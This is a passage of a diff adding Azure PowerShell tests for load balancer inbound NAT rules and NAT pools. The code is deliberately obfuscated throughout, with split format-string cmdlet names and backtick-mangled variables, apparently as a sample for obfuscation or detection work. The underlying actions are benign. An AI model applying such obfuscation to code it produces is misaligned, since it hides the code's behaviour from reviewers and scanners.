+        if(-not ${s`Ub`NET}."I`d")
+        {
+            ${SU`BnEt} = &("{5}{7}{0}{1}{4}{3}{2}{6}" -f 't','wo','u','kS','r','Get-AzVirtual','bnetConfig','Ne') -Name ${suBNE`T`NamE} -VirtualNetwork ${viR`Tu`A`LNetWO`RK};
+        }
+        ${FrO`NTEndiPCoNF`I`gu`RATi`oN} = &("{3}{1}{2}{0}{4}{5}"-f 'ontendI','w-AzLoadBala','ncerFr','Ne','pConfi','g') -Name ${fRo`NTe`NdiPC`OnfIG`Urat`i`onnA`me} -Subnet ${su`BnEt};
+
+        
+        ${VIn`BOuNd`NA`TRuLE} = &("{1}{6}{4}{5}{2}{3}{0}"-f 'g','New','Rul','eConfi','zLoadBalan','cerInboundNat','-A') -Name ${r`NA`Me} -FrontendIpConfiguration ${frONT`e`NdiP`cON`Figurati`ON} -Protocol ${PROTo`C`Ol} -FrontendPort ${fr`On`TEnDp`ORt} -BackendPort ${baCKe`Nd`p`Ort} -IdleTimeoutInMinutes ${idlETIMEOUTINMIN`U`T`es} -EnableFloatingIP;
+        &("{2}{0}{1}" -f 'sert-','NotNull','As') ${vI`N`Bound`NAtRUlE};
+        &("{2}{1}{0}"-f't-True','ser','As') { &("{3}{5}{4}{1}{0}{2}"-f 'y','ReturnT','pe','Check','let','-Cmd') ("{1}{3}{4}{7}{2}{5}{0}{6}"-f'Ru','New-AzLo','InboundN','adB','al','at','leConfig','ancer') ${VIN`BO`Un`DnATR`ULe} };
+        ${Vl`o`AdbAlAN`CeR} = &("{4}{3}{1}{0}{2}"-f 'dB','oa','alancer','AzL','New-') -ResourceGroupName ${RGN`Ame} -Name ${rn`AMe} -InboundNatRule ${vi`Nb`OU`Nd`N`ATRuLe} -FrontendIPConfiguration ${fRoNTE`N`DIp`coN`FI`g`URATIon} -Location ${L`OcaTi`on};
+        &("{0}{3}{1}{2}" -f'Ass','NotN','ull','ert-') ${VLoa`dbALA`NC`ER};
+        &("{2}{1}{0}" -f 'ull','ssert-NotN','A') ${Vlo`ADBA`La`NC`er}."fR`on`TEnd`IP`confiGuRATIOnS";
+        &("{1}{0}{2}" -f 'ser','As','t-True') { ${VLoadbaL`ANC`eR}."FrON`TE`NDIPc`ONF`I`GUrATiOns"."lE`N`GTh" -gt 0 };
+        &("{0}{2}{3}{1}"-f'Assert','eEqual','-','Ar') ${Rn`AmE} ${VINB`Ou`NDn`ATRU`Le}."nA`mE";
+        &("{1}{0}{2}" -f'sser','A','t-AreEqual') ${prOT`Oc`Ol} ${viN`BOu`N`D`NATRULE}."pr`OtOC`oL";
+        &("{4}{2}{0}{1}{3}" -f 'er','t-AreEq','ss','ual','A') ${F`ROnTeNd`P`O`Rt} ${v`InBO`U`NDN`ATRUle}."FRON`Te`N`DPOrt";
+        &("{3}{4}{0}{2}{1}" -f 'A','al','reEqu','Assert','-') ${bacKe`N`DPOrt} ${VinB`ouN`dN`ATrU`lE}."baC`keN`DPORT";
+        &("{3}{4}{0}{1}{2}" -f'rt-AreEq','u','al','As','se') ${idletI`M`Eo`UTinMInuTEs} ${VINbo`U`N`DNAtRULe}."idl`EtI`m`eOUt`I`NmInUtEs";
+        &("{4}{1}{3}{0}{2}" -f 'a','-AreE','l','qu','Assert') ${eNAB`lEF`LO`AtINgip} ${Vin`Bo`UNd`NATR`ULE}."enABle`Flo`ATi`Ngip";
+        &("{0}{1}{3}{2}" -f'Asser','t-Ar','l','eEqua') ${Ena`BLE`TCpRE`Set} ${ViN`Bo`UNDnaT`RULE}."eN`AbLetc`pRe`SET";
+
+        
+        ${V`i`NBOu`N`DNATrule} = &("{1}{2}{5}{10}{9}{3}{0}{8}{4}{7}{6}"-f'alancerInb','G','et','adB','NatRuleC','-','fig','on','ound','zLo','A') -LoadBalancer ${Vl`oa`dB`ALANC`Er} -Name ${rn`A`mE};
+        &("{1}{2}{0}{3}{4}" -f'rt-','Ass','e','Not','Null') ${VInbO`UndNA`TR`UlE};
+        &("{0}{2}{3}{1}" -f 'Ass','rue','ert-','T') { &("{3}{0}{1}{5}{4}{2}"-f'eck-Cmd','l','Type','Ch','urn','etRet') ("{4}{0}{6}{3}{5}{1}{2}{7}" -f'la','tR','uleConfi','rInbo','Get-AzLoadBa','undNa','nce','g') ${VInboUNDna`TR`U`LE} };
+        &("{1}{0}{2}{3}"-f 'ssert-Ar','A','eE','qual') ${rn`AMe} ${vIn`B`o`Undn`AtRuLE}."nA`mE";
+        &("{1}{0}{3}{2}{4}" -f 's','A','t','ser','-AreEqual') ${pro`T`OCol} ${VI`NBo`Undnatr`U`LE}."PRO`T`OCOl";
+        &("{3}{2}{0}{1}"-f't-AreEq','ual','r','Asse') ${f`Ron`T`endp`orT} ${vInB`o`U`N`dNaTR`UlE}."fR`ON`Te`NDPoRT";
+        &("{3}{0}{4}{2}{1}"-f'se','ual','eEq','As','rt-Ar') ${baCk`eN`DpORT} ${Vin`BOuN`dN`A`TrulE}."bACK`enDp`oRT";
+        &("{0}{1}{2}" -f 'Assert','-Ar','eEqual') ${i`dle`TIMEOutINMIN`U`T`eS} ${vIN`B`oUnd`NAtRu`lE}."Id`l`ETime`oUT`iNMI`NUteS";
+        &("{1}{0}{2}{4}{3}"-f 'sert','As','-Ar','qual','eE') ${eNaBLe`F`lOATi`NgiP} ${Vi`Nb`O`UNdn`ATRulE}."EN`ABlefloa`Ti`N`GiP";
+        &("{2}{1}{3}{0}{4}"-f'e','t','Asser','-Ar','Equal') ${ENAb`LetCp`RE`set} ${vi`NbO`UndnA`TR`Ule}."en`Ab`LetCp`R`Eset";
+
+        
+        ${l`ISTINBOU`N`dnAtrUlE} = &("{3}{0}{1}{8}{7}{5}{2}{4}{6}"-f'AzL','o','ndNat','Get-','RuleConf','ncerInbou','ig','a','adBal') -LoadBalancer ${VlO`ADBAlA`NC`Er};
+        &("{1}{2}{0}"-f 'Null','Assert-N','ot') (${L`isTI`NboU`N`dn`ATRuLE} | &("{2}{0}{1}" -f 'here-Ob','ject','W') { ${_}."n`AMe" -eq ${r`NaME} });
+
+        
+        ${VLOADBa`LANC`eR} = &("{2}{4}{9}{8}{10}{5}{1}{6}{7}{3}{0}" -f'g','R','Se','fi','t-AzLoadBala','Nat','u','leCon','nbo','ncerI','und') -Name ${rn`AME} -LoadBalancer ${vloADBaLAN`C`er} -FrontendIpConfiguration ${fr`oNTEn`DIPConfig`U`RA`TI`oN} -Protocol ${Pr`O`TOCOlSET} -FrontendPort ${froNtEN`d`P`o`RTsEt} -BackendPort ${Ba`cK`e`NDPoR`TsET} -IdleTimeoutInMinutes ${iDletiMeOuT`In`M`iNUte`sS`Et};
+        &("{0}{2}{3}{1}{4}" -f 'As','Nul','s','ert-Not','l') ${vLoaDbA`L`ANc`Er};
+        ${vl`OaD`Bal`An`cer} = &("{2}{3}{4}{0}{1}"-f'nc','er','Set-A','zLoad','Bala') -LoadBalancer ${VL`OADBAlA`NC`eR};
+        &("{2}{0}{3}{1}"-f'rt','Null','Asse','-Not') ${VLOA`D`Ba`lA`NCEr};
+
+        
+        ${VIn`BO`UnDN`A`T`Rule} = &("{7}{5}{0}{2}{4}{1}{6}{8}{3}"-f 't-AzLoadBalanc','dNa','erInbou','g','n','e','tRul','G','eConfi') -LoadBalancer ${Vl`o`A`DBAlaNc`ER} -Name ${rn`Ame};
+        &("{3}{2}{0}{1}" -f't-Not','Null','er','Ass') ${Vi`NB`oUn`DnAt`RuLE};
+        &("{2}{3}{0}{1}" -f 'rt','-True','As','se') { &("{2}{3}{1}{0}"-f 'turnType','tRe','Check','-Cmdle') ("{1}{0}{5}{4}{7}{9}{6}{2}{8}{3}"-f'e','G','C','g','Ba','t-AzLoad','cerInboundNatRule','l','onfi','an') ${VinBouN`D`Na`TrUle} };
+        &("{1}{0}{2}{4}{3}"-f 'sser','A','t-AreE','ual','q') ${rn`A`ME} ${vi`N`B`OUND`NaTrule}."n`AmE";
+        &("{0}{2}{3}{1}" -f 'A','l','sser','t-AreEqua') ${PRotOc`O`l`seT} ${VI`NB`ou`Ndnat`RULe}."P`ROTo`COl";
+        &("{4}{1}{2}{0}{3}"-f'E','sert-Ar','e','qual','As') ${froNTE`NdpOr`Ts`eT} ${V`I`NBOUND`NatruLe}."F`Ron`TeNdP`ORt";
+        &("{4}{0}{3}{2}{1}" -f'sse','al','qu','rt-AreE','A') ${baC`kendp`Or`TsEt} ${vINBounD`Na`TrulE}."baC`kEnd`Po`RT";
+        &("{4}{1}{0}{3}{2}" -f 'er','ss','reEqual','t-A','A') ${I`D`letIMEou`TINmInUTEs`set} ${ViN`B`Oun`DNaTR`ULE}."I`dLETI`MeO`U`TIn`MInUT`es";
+        &("{1}{0}{2}"-f 'e','Ass','rt-AreEqual') ${ENAbLe`FL`oa`T`InGiPSeT} ${vI`NboUn`dn`AT`RUle}."Ena`B`Lef`LoATING`Ip";
+        &("{1}{2}{3}{4}{0}" -f 'eEqual','Ass','e','rt-','Ar') ${E`NABLET`CP`RESetsET} ${viNb`OU`NdNA`TRU`LE}."enabl`ET`cPREs`et";
+
+        
+        ${lIs`TI`N`B`OuNDnaTruLe} = &("{1}{0}{2}{6}{5}{3}{4}" -f '-AzLoadBala','Get','nc','onf','ig','oundNatRuleC','erInb') -LoadBalancer ${vl`o`Adba`LAnCEr};
+        &("{3}{4}{2}{0}{1}" -f 'ot','Null','N','Asse','rt-') (${LI`ST`INBOund`NAtr`ULE} | &("{1}{0}{3}{2}" -f'he','W','e-Object','r') { ${_}."n`AmE" -eq ${RN`A`mE} });
+
+        
+        ${vlo`ADb`ALAnCeR} = &("{3}{1}{5}{11}{2}{8}{4}{6}{7}{0}{10}{9}"-f'RuleConf','LoadBa','r','Add-Az','b','lanc','o','undNat','In','g','i','e') -Name ${rN`Am`EADD} -LoadBalancer ${v`lO`ADB`ALAnceR} -FrontendIpConfiguration ${Fr`On`TENDIp`cONFigUR`AtIoN} -Protocol ${P`RoTOc`oLa`DD} -FrontendPort ${fROnTendP`o`Rt`Add} -BackendPort ${BaC`kEN`DpO`Rt`Add} -IdleTimeoutInMinutes ${id`lE`TiME`o`U`TiNmIN`UTEsAdD};
+        &("{2}{1}{0}"-f 'otNull','t-N','Asser') ${Vl`o`AdbaLa`NCER};
+        ${vlo`A`dbAlaN`C`er} = &("{3}{2}{0}{1}"-f 'AzLoadBalan','cer','-','Set') -LoadBalancer ${VL`OADba`LAncer};
+        &("{3}{0}{1}{2}"-f '-Not','Nu','ll','Assert') ${Vlo`AD`Ba`LANCEr};
+
+        
+        ${Vi`NBoUn`D`Na`TRULE} = &("{7}{3}{5}{8}{1}{0}{4}{6}{2}" -f'boun','cerIn','ig','-Az','dN','L','atRuleConf','Get','oadBalan') -LoadBalancer ${vl`O`A`dbalaNcEr} -Name ${r`NAMeA`Dd};
+        &("{0}{3}{2}{1}" -f 'Assert-Not','l','l','Nu') ${VinbOu`NDn`At`R`ULe};
+        &("{3}{1}{0}{2}"-f'ru','t-T','e','Asser') { &("{0}{3}{1}{4}{5}{2}" -f'Check-','m','urnType','C','dletRe','t') ("{0}{1}{7}{6}{4}{2}{5}{3}" -f 'Get-Az','Lo','erInboundNatRuleC','ig','lanc','onf','dBa','a') ${VINbOUn`d`NA`Tru`le} };
+        &("{1}{3}{2}{0}"-f 'qual','Asse','AreE','rt-') ${rName`A`dD} ${v`iNb`OU`NDNat`RulE}."na`mE";
+        &("{4}{0}{3}{2}{1}"-f 'ser','al','reEqu','t-A','As') ${PRoTOC`OL`AdD} ${viNBoU`ND`NAT`Ru`lE}."P`Ro`TocOl";
+        &("{2}{3}{1}{0}" -f 'AreEqual','ert-','As','s') ${fr`ONtENd`p`OR`TADd} ${vinbO`UNdNat`RU`le}."FrON`TENDpo`RT";
+        &("{2}{4}{3}{1}{0}"-f 'al','qu','Asser','E','t-Are') ${bA`cKendPO`R`TADd} ${vi`Nbou`NdN`ATrULE}."b`ACKeNDp`oRt";
+        &("{4}{0}{2}{3}{1}" -f'e','reEqual','r','t-A','Ass') ${IdleTiMeo`U`T`Inmi`NUtesADd} ${vin`BOu`NDNa`TrUlE}."IdLet`i`Meo`U`TiNMIn`Utes";
+        &("{4}{1}{3}{0}{2}"-f 'qu','ss','al','ert-AreE','A') ${E`Na`BlEf`LOatI`N`gIpADD} ${vinbo`UN`DN`AT`RULE}."E`NA`BL`eFl`oaTI`NgIP";
+        &("{2}{1}{0}" -f 'ual','AreEq','Assert-') ${EnabL`etcp`RE`S`EtA`Dd} ${v`InBouN`dNA`TR`ULE}."ENABL`eTC`p`Re`seT";
+
+        
+        ${L`istIn`Bou`NdnATrU`lE} = &("{6}{8}{3}{1}{2}{4}{0}{5}{7}"-f 'u','la','ncerInb','a','o','ndNatRuleConfi','Get-AzLoa','g','dB') -LoadBalancer ${vlo`Ad`BALA`N`CER};
+        &("{0}{3}{2}{4}{1}" -f 'A','l','er','ss','t-NotNul') (${lIst`inB`OuN`DnA`T`R`Ule} | &("{3}{1}{2}{0}"-f 't','e','-Objec','Wher') { ${_}."NA`Me" -eq ${R`NameA`Dd} });
+
+        
+        &("{4}{2}{0}{6}{3}{1}{5}"-f't-T','sCon','sser','w','A','tains','hro') { &("{3}{9}{5}{6}{10}{2}{1}{4}{0}{8}{7}"-f 'e','er','c','Add-','InboundNatRul','a','dBa','ig','Conf','AzLo','lan') -Name ${RNA`meA`dd} -LoadBalancer ${v`lo`ADBAlaNcEr} -FrontendIpConfiguration ${FR`on`T`en`dIPcoN`FI`g`URaTIoN} -Protocol ${Pr`ot`oCOL`Add} -FrontendPort ${f`ROnt`ENdpORTa`dd} -BackendPort ${Ba`CKE`NDpOR`TAdd} -IdleTimeoutInMinutes ${i`dLeti`m`Eo`U`TInmiNut`e`sADD} } ("{2}{1}{0}" -f 'xists','dy e','alrea');
+
+        
+        ${V`loAD`BalA`N`CEr} = &("{8}{5}{0}{6}{4}{10}{7}{9}{3}{1}{2}"-f'AzL','nf','ig','eCo','Balanc','e-','oad','InboundNa','Remov','tRul','er') -LoadBalancer ${VloAdB`A`LA`NcEr} -Name ${rn`Am`EAdd};
+        ${vLO`A`DbA`la`NcEr} = &("{0}{10}{1}{11}{4}{3}{9}{8}{12}{2}{5}{7}{6}"-f 'R','move-','erInbo','ad','Lo','undNatR','Config','ule','lan','Ba','e','Az','c') -LoadBalancer ${VlOaDbALa`N`c`ER} -Name ${rNa`mE};
+        
+        ${v`LO`AdbA`l`ANCEr} = &("{2}{6}{0}{4}{1}{3}{5}" -f 'o','erInboundNatRuleC','R','o','ve-AzLoadBalanc','nfig','em') -LoadBalancer ${VlO`A`Dba`LAnc`ER} -Name ${rN`AME};
+        
+        ${VL`OADbA`LAnceR} = &("{1}{3}{4}{0}{2}" -f 'e','S','r','et-AzLoadB','alanc') -LoadBalancer ${VLOa`db`AL`An`CEr};
+        &("{3}{2}{0}{1}"-f'ot','Null','N','Assert-') ${Vl`OADbAlA`Nc`Er};
+
+        
+        &("{3}{1}{0}{2}{5}{4}"-f'sert-','s','ThrowsCo','A','s','ntain') { &("{4}{11}{10}{7}{0}{9}{8}{5}{3}{6}{2}{1}" -f'd','g','Confi','NatRul','G','nbound','e','a','ancerI','Bal','AzLo','et-') -LoadBalancer ${Vlo`ADbaLA`N`CEr} -Name ${R`N`Ame} } ("{1}{3}{0}{5}{2}{4}{6}" -f 'e c','Sequ','ng ele','enc','m','ontains no matchi','ent');
+
+        
+        &("{1}{2}{0}{3}" -f'ont','As','sert-ThrowsC','ains') { &("{0}{3}{1}{5}{6}{9}{7}{4}{8}{2}"-f 'Set','zL','ig','-A','NatRuleCo','oadBalanc','er','bound','nf','In') -Name ${r`N`AME} -LoadBalancer ${VLO`Ad`BAL`AnCeR} -FrontendIpConfiguration ${FRONteN`dipC`Onf`IGu`R`Ati`on} -Protocol ${p`ROTOcOls`et} -FrontendPort ${fronTENd`Po`RTsEt} -BackendPort ${bacKEN`dp`OrTsET} -IdleTimeoutInMinutes ${Id`lEt`Im`eOUti`N`MiNuTesSet} } ("{1}{4}{0}{3}{2}"-f 'x','do','t','is','es not e');
+    }
+    finally
+    {
+        
+        &("{3}{2}{4}{1}{0}" -f'p','ou','an-Resource','Cle','Gr') ${R`gNaME};
+    }
+}
+
+
+function TeS`T-inbO`UNdNA`TPoolCruDm`I`NIMal`ParAMe`TERS
+{
+    
+    ${RGnA`ME} = &("{0}{3}{5}{6}{4}{1}{2}"-f'Ge','eGroupNa','me','t-R','c','eso','ur');
+    ${rg`LO`Cat`ion} = &("{3}{0}{2}{5}{1}{4}"-f'o','ocatio','vider','Get-Pr','n','L') ("{2}{4}{0}{3}{1}" -f 'Mana','ent','R','gem','esource');
+    ${rN`AmE} = &("{4}{2}{1}{0}{3}"-f 'ourceN','s','t-Re','ame','Ge');
+    ${r`N`A`MeADD} = "${rname}Add";
+    ${lo`Cati`on} = &("{0}{2}{4}{1}{3}"-f'Get-P','o','ro','cation','viderL') ("{6}{7}{3}{0}{5}{4}{1}{2}" -f '/loa','er','s','oft.Network','anc','dBal','Mi','cros');
+    
+    ${p`RO`TO`Col} = "Udp";
+    ${fronTEnD`Por`TrA`Nge`stART} = 555;
+    ${FrOn`T`en`Dpor`Tra`NgEENd} = 999;
+    ${BacKE`N`D`Port} = 987;
+    
+    ${p`R`OToCoLS`Et} = "Tcp";
+    ${FroN`Ten`DPortR`ANg`EstaRts`eT} = 777;
+    ${frOnt`EN`D`pOrtr`ANgeEndSET} = 888;
+    ${b`ACKEn`d`PoRTS`Et} = 789;
+    
+    ${pR`O`TOc`OlAdd} = "Tcp";
+    ${FRONtEN`DpORTrA`NgE`STa`RT`ADd} = 444;
+    ${froNtenDp`O`RTranG`e`EN`DaDd} = 445;
+    ${baCkeN`Dp`O`Rt`AdD} = 8080;
+    
+    ${PUbLI`c`IPADdREs`Sn`AME} = ("{5}{2}{0}{4}{3}{1}" -f'A','me','blicIP','ressNa','dd','Pu');
+    ${PU`BliciP`Ad`drESSALLO`ca`T`ioNMet`H`od} = ("{1}{0}" -f 'tatic','S');
+    ${f`ROntEnd`IPcONFIGuR`ATi`o`Nn`A`ME} = ("{1}{4}{0}{5}{3}{2}"-f'iguration','Fronten','me','a','dIPConf','N');
+
+    try
+    {
+        ${rEsO`Urc`EGrouP} = &("{1}{2}{0}{3}"-f'our','New-Az','Res','ceGroup') -Name ${r`Gna`me} -Location ${RGl`OCA`T`iON};
+
+        
+        ${PublIc`IpaDD`RE`Ss} = &("{4}{0}{1}{3}{2}" -f 'e','w-AzPubl','ss','icIPAddre','N') -ResourceGroupName ${RG`Name} -Location ${LOca`Ti`on} -Name ${p`UB`l`IcipaDd`ReSsnaME} -AllocationMethod ${Pu`BlicIP`AD`dress`AL`LocAt`i`onm`eTHOD};
+        ${frONTe`N`D`IpCOnfIguRA`TioN} = &("{5}{4}{3}{0}{2}{1}" -f 'tendIp','fig','Con','Fron','oadBalancer','New-AzL') -Name ${FroNT`e`NdIPC`O`NFIGuRa`TIONNaMe} -PublicIpAddress ${PU`BLiCi`pADd`RESs};
+
+        
+        ${Vin`Bou`Nd`N`ATPOOL} = &("{1}{3}{5}{6}{0}{2}{4}" -f 'NatPo','New','olCon','-','fig','AzLoadB','alancerInbound') -Name ${rNa`me} -FrontendIpConfiguration ${F`RontE`N`d`ipcOnfiguratiON} -Protocol ${PRoTo`cOL} -FrontendPortRangeStart ${fr`ONTEn`DpO`R`TRAnGeSTa`RT} -FrontendPortRangeEnd ${f`Ro`N`TEn`DPOr`TraNgEeND} -BackendPort ${BA`CKEN`dPO`RT};
+        &("{4}{0}{2}{1}{3}"-f'o','N','t','ull','Assert-N') ${v`I`NBouND`NaTpoOL};
+        &("{2}{0}{1}"-f't-','True','Asser') { &("{6}{5}{2}{4}{0}{3}{1}" -f 'ur','e','Cmd','nTyp','letRet','-','Check') ("{5}{1}{3}{6}{7}{2}{4}{0}"-f 'oolConfig','zLoadBal','und','ancer','NatP','New-A','Inb','o') ${Vi`NbOu`NDNaT`POoL} };
+        ${vLOAd`B`ALAn`ceR} = &("{0}{1}{2}{3}"-f'New','-A','zLoadBala','ncer') -ResourceGroupName ${RGna`Me} -Name ${r`NAME} -InboundNatPool ${VInBo`Un`D`Na`TPOOL} -FrontendIPConfiguration ${FR`onteNDIPC`On`Fi`guRA`TIOn} -Location ${l`OcAti`oN};
+        &("{3}{2}{4}{0}{1}"-f 'u','ll','ser','As','t-NotN') ${V`LOADba`lANc`eR};
+        &("{0}{1}{2}{3}{4}"-f 'Asse','rt','-N','otNul','l') ${v`LOaDb`AlAn`cEr}."f`R`OnteNDiP`Con`FIgUR`At`io`NS";
+        &("{2}{0}{1}"-f'r','t-True','Asse') { ${VlOA`d`BA`LANCeR}."FrOnten`di`Pco`NFigUrA`T`iOnS"."L`enG`Th" -gt 0 };
+        &("{1}{3}{2}{0}"-f'ual','A','rt-AreEq','sse') ${rN`A`me} ${vI`Nb`O`UnDn`Atpool}."NA`mE";
+        &("{2}{3}{4}{0}{1}" -f'eE','qual','Asse','rt-','Ar') ${PRoToc`Ol} ${Vinb`oU`NdN`Atpo`ol}."PRot`o`Col";
+        &("{0}{2}{1}" -f'As','reEqual','sert-A') ${F`ROnTendp`oRtr`A`N`Ge`stArT} ${VIn`B`OU`NdnaTpOoL}."Fro`NTEndP`ort`R`Anges`T`ARt";
+        &("{0}{2}{1}{3}"-f 'As','eEqua','sert-Ar','l') ${FRo`N`TEN`dpo`R`TRanGEENd} ${v`i`NbouN`DN`A`TPOOl}."frOnTEn`dPO`RtrAn`ge`EnD";
+        &("{3}{2}{1}{0}"-f 'al','Equ','ert-Are','Ass') ${bAc`KEnD`PO`Rt} ${Vi`N`Bo`UNDNaTpoOl}."b`ACkeNDp`o`RT";
+
+        
+        ${VIn`BoUnDNaT`p`OoL} = &("{5}{1}{8}{6}{3}{9}{2}{0}{7}{4}{10}" -f'Inboun','AzL','er','al','NatPool','Get-','B','d','oad','anc','Config') -LoadBalancer ${V`L`OAdbAla`NCER} -Name ${rn`AME};
+        &("{1}{0}{2}" -f'sert-','As','NotNull') ${v`inbou`Ndn`AtPooL};
+        &("{1}{0}{2}" -f'ert-T','Ass','rue') { &("{5}{1}{4}{3}{2}{6}{0}" -f'nType','heck','Re','t','-Cmdle','C','tur') ("{2}{4}{5}{1}{0}{6}{3}"-f'NatPoolCo','erInbound','Get-AzLoadB','ig','a','lanc','nf') ${V`INBou`Ndn`Atp`OOl} };
+        &("{0}{2}{1}{3}{4}"-f'A','sert','s','-Are','Equal') ${r`Name} ${Vin`BOu`NDN`AtPOOl}."N`AMe";
+        &("{1}{0}{2}"-f'AreEqua','Assert-','l') ${prO`ToC`ol} ${v`I`NB`ouNDn`AtpOol}."PROT`o`col";
+        &("{1}{2}{3}{0}"-f'eEqual','Ass','e','rt-Ar') ${f`ROnteNDp`oRt`RAnGE`sTART} ${V`In`BouNDNat`POoL}."FrO`NTeNd`PoRtr`An`geSt`ART";
+        &("{2}{0}{3}{1}{4}" -f'ss','rt-AreE','A','e','qual') ${f`RoNTeN`dP`ORTran`GE`ENd} ${V`INBounD`NaT`p`Ool}."F`RO`NtenDpO`R`TrANg`EE`ND";
+        &("{3}{0}{1}{2}{4}"-f 'se','rt-A','reEqu','As','al') ${bacK`En`Dp`oRT} ${Vi`NBOu`Ndn`ATpo`OL}."bac`Ke`NDp`oRT";
+
+        
+        ${li`sT`iNB`OuN`DNA`TPoOl} = &("{3}{1}{0}{4}{2}{6}{5}"-f'dNa','AzLoadBalancerInboun','Po','Get-','t','Config','ol') -LoadBalancer ${V`LOA`dBaLa`NCeR};
+        &("{0}{1}{2}{3}" -f 'Assert','-','No','tNull') (${L`iS`T`iNBoU`Nd`NaTPOoL} | &("{3}{0}{1}{2}" -f'here-','Obje','ct','W') { ${_}."nA`mE" -eq ${Rn`Ame} });
+
+        
+        ${vlOaDba`lAN`CeR} = &("{1}{3}{8}{0}{6}{2}{7}{4}{5}" -f 'nb','Set-A','Nat','zLoadBalance','fi','g','ound','PoolCon','rI') -Name ${Rna`ME} -LoadBalancer ${v`lOAD`BAL`AncER} -FrontendIpConfiguration ${f`RONten`dip`Con`FIg`URaTIOn} -Protocol ${pr`o`To`Colset} -FrontendPortRangeStart ${f`ROn`T`End`PoRTr`ANGeSTa`RTset} -FrontendPortRangeEnd ${FroNTeNDPOr`TrAngE`E`ND`SET} -BackendPort ${bAcKE`ND`po`RtsET};
+        &("{2}{4}{1}{3}{0}"-f 'tNull','s','A','ert-No','s') ${VlOaD`BaL`AN`cER};
+        ${vLo`AD`BA`laNc`ER} = &("{1}{2}{3}{0}"-f 'adBalancer','Set-','A','zLo') -LoadBalancer ${v`L`OadBALan`CeR};
+        &("{2}{0}{4}{3}{1}"-f 'r','Null','Asse','ot','t-N') ${vl`oA`DBaL`AnceR};
+
+        
+        ${VINBOu`NDNaTP`ooL} = &("{4}{9}{7}{0}{5}{3}{1}{10}{8}{2}{6}" -f 'adBa','nd','o','Inbou','G','lancer','lConfig','o','Po','et-AzL','Nat') -LoadBalancer ${v`Lo`ADBa`LA`NCER} -Name ${r`N`Ame};
+        &("{3}{0}{2}{1}"-f 'ert-N','tNull','o','Ass') ${V`InBo`UnD`NATPoOl};
+        &("{0}{2}{1}{3}"-f'As','T','sert-','rue') { &("{3}{0}{4}{6}{2}{5}{1}"-f'hec','turnType','let','C','k-C','Re','md') ("{1}{5}{3}{0}{7}{8}{6}{2}{10}{4}{9}" -f 'a','Get','boundNatPool','adBal','onf','-AzLo','rIn','nc','e','ig','C') ${ViNBounD`Na`T`poOL} };
+        &("{1}{0}{2}{3}" -f'ert','Ass','-A','reEqual') ${r`N`AMe} ${ViNb`O`UndnAT`POoL}."Na`me";
+        &("{2}{3}{1}{4}{0}"-f'reEqual','ert','A','ss','-A') ${P`ROTo`COlset} ${Vi`N`B`OUndnaT`poOl}."p`RoTocol";
+        &("{3}{4}{1}{2}{0}"-f'l','er','t-AreEqua','As','s') ${f`Ront`ENdp`OrTRa`NgEs`TaRtS`eT} ${VINBo`UnD`N`Atp`o`Ol}."FronTe`NDPo`RtrAng`EStA`RT";
+        &("{0}{1}{2}" -f 'Asser','t','-AreEqual') ${FRO`NtEN`dpor`T`RA`Nge`en`dseT} ${vINb`OUNd`Na`TpOOl}."fRO`NTe`NDP`o`RtRangE`eND";
+        &("{3}{1}{2}{0}"-f'-AreEqual','ser','t','As') ${bAC`k`eNdPO`RtSeT} ${v`i`NBOu`NdnaTPO`oL}."bA`C`KEnDpoRT";
+
+        
+        ${l`istI`NBo`UNDNaTp`ool} = &("{6}{5}{4}{1}{0}{2}{7}{3}"-f'e','c','rInbo','ig','dBalan','et-AzLoa','G','undNatPoolConf') -LoadBalancer ${Vl`oa`dbalANcer};
+        &("{2}{0}{1}{3}" -f'ssert-','NotN','A','ull') (${LiSTi`NbO`UNdN`ATpoOL} | &("{0}{1}{2}" -f 'Where-','Obj','ect') { ${_}."na`me" -eq ${r`Name} });
+
+        
+        ${vlOaD`B`AL`ANCeR} = &("{5}{3}{0}{2}{4}{8}{6}{7}{1}"-f'adB','fig','alanc','AzLo','erIn','Add-','PoolC','on','boundNat') -Name ${R`NAM`Ea`dd} -LoadBalancer ${vL`OADBalA`NcEr} -FrontendIpConfiguration ${frO`N`T`e`NdiPCo`NFIGuRATioN} -Protocol ${p`R`otOCO`LADd} -FrontendPortRangeStart ${Fron`T`eNDpO`R`T`R`A`N`GESTarTADd} -FrontendPortRangeEnd ${FrOntE`N`D`por`TranGEenda`Dd} -BackendPort ${BacKenDp`O`R`TAdD};
+        &("{1}{2}{3}{4}{0}" -f'Null','Asse','rt-','N','ot') ${Vl`OA`dBaLan`CEr};
+        ${vloadbA`l`ANc`Er} = &("{4}{3}{1}{0}{2}{5}" -f'Loa','z','dBa','et-A','S','lancer') -LoadBalancer ${VlOADB`Al`A`NcEr};
+        &("{4}{3}{2}{0}{1}" -f 't-NotNul','l','r','e','Ass') ${v`L`OAdBAla`NcEr};
+
+        
+        ${V`iNbou`N`d`NAt`PoOl} = &("{7}{0}{8}{3}{2}{9}{1}{5}{6}{4}" -f 'AzLoa','ndNat','e','anc','g','Poo','lConfi','Get-','dBal','rInbou') -LoadBalancer ${vL`oaDba`l`AN`cER} -Name ${rNAMe`ADd};
+        &("{2}{1}{0}{3}" -f 'No','t-','Asser','tNull') ${viN`BOun`dNatpo`ol};
+        &("{2}{1}{0}"-f 'e','u','Assert-Tr') { &("{3}{5}{1}{2}{4}{0}{6}" -f 'eturn','-','Cmd','Chec','letR','k','Type') ("{2}{3}{1}{4}{0}{6}{5}" -f 'I','oadB','Get-A','zL','alancer','ig','nboundNatPoolConf') ${v`INBOu`NDnaT`POol} };
+        &("{3}{0}{1}{2}"-f'ssert-A','reEqua','l','A') ${Rn`A`mEadD} ${vINB`Ou`Nd`NATPo`OL}."n`AmE";
+        &("{1}{2}{3}{0}{4}" -f't','A','sse','r','-AreEqual') ${pr`Ot`oC`oladd} ${v`iNbo`U`NdNa`TPOol}."P`R`OtOcoL";
+        &("{2}{1}{0}{3}" -f'E','Are','Assert-','qual') ${FRo`NTEnD`Po`RtraNGEstA`RtaDD} ${Vi`NbOu`NDNa`TPoOl}."f`RoNTE`N`DpORTrang`estarT";
+        &("{0}{4}{3}{2}{1}" -f'Ass','l','a','-AreEqu','ert') ${f`RONtE`NDPOrt`RaN`ge`e`NDAdD} ${VIn`BouN`DnA`Tp`OOl}."froNt`endP`o`RTrang`Eend";
+        &("{0}{1}{3}{2}" -f 'As','sert-','eEqual','Ar') ${b`A`ck`eN`dPORtADD} ${VI`Nb`OU`NDNat`pooL}."BacKeN`dP`O`Rt";
+
+        
